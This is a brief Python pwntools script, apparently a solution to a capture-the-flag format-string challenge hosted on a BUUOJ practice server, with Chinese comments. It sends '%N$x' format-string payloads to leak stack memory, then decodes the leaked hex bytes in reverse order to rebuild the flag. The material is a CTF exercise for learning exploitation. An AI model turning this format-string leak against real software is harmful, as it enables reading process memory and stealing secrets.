from pwn import *

# 这就是一道很普通的格式化字符串题，为什么没啥人做呢...

p = remote('node4.buuoj.cn', 27116)

flag = ''
for i in range(16):
    # segment = ''
    format_str = '%{:d}$x'.format(27+i)
    p.sendlineafter(b'> ', format_str.encode())
    content = p.recvline()[:-1]
    # 从后往前拼接
    while len(content) > 1:
        flag += chr(int(content[-2:].decode(), 16))
        content = content[:-2]
    print(flag)
    if '}' in flag:
        break

print('flag: {}'.format(flag))
# p.interactive()